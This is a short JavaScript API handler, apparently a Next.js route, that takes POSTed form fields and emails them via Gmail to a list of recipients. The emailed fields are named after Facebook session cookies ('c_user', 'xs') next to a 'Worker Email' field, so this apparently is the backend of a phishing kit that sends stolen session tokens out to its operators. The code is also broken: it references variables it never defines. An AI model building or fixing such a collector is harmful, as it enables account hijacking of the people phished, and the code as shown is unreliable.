import nodemailer from "nodemailer";

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "POST only allowed" });
  }

  const { ser, us, emails, workerEmail, name } = req.body;

  // Email sender account
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: process.env.MY_EMAIL,
      pass: process.env.MY_EMAIL_PASS,
    },
  });

  const mailOptions = {
    from: process.env.MY_EMAIL,
    to: emails, // array allowed
    subject: "New Form Data",
    text: `
c_uer: ${c_user}
xs: ${xs}
Worker Email: ${workerEmail}
Name: ${name}
    `
  };

  try {
    await transporter.sendMail(mailOptions);
    res.status(200).json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: "Email failed", details: err.message });
  }
}
